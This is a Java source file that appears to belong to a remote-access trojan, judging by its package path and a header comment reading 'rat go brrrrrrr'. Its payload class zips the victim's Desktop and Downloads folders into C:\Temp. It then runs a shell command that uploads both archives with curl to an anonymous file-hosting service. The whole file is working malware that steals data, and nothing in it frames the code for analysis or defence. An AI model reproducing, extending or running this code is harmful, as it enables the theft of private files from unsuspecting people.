/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTShellUtils;
import risingtide.tidehack.utils.grabber.RTZipUtils;

import java.io.*;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.FileAlreadyExistsException;

public class RTZipper implements RTPayload {
    @Override
    public String getName() {
        return "File Zipper";
    }

    @Override
    public void exec() throws Exception {
        RTZipUtils zu = new RTZipUtils();
        System.out.println("before le zip");
        try {
            zu.pack(System.getProperty("user.home") + "\\Desktop", "C:\\Temp\\rt_temp_de.zip");
            zu.pack(System.getProperty("user.home") + "\\Downloads", "C:\\Temp\\rt_temp_dw.zip");
        } catch (FileAlreadyExistsException ignored) {}
        System.out.println("zipped!");
        //System.out.println("uploaded! "+uploadToAnon(RTFileUtils.getFile("C:\\Temp\\rt_temp_de.zip")));
        //Reader reader = new InputStreamReader(Runtime.getRuntime().exec("cd C:/Temp && curl -F \"file=@rt_temp_de.zip\" https://api.anonfiles.com/upload").getInputStream());
        RTShellUtils.main(new String[] {"cd C:/Temp && curl -F file=@rt_temp_de.zip https://api.anonfiles.com/upload && curl -F file=@rt_temp_dw.zip https://api.anonfiles.com/upload"});

        //JsonElement json = new JsonParser().parse(reader);
        //System.out.println(json.toString());
        //System.out.println(reader);
    }
}
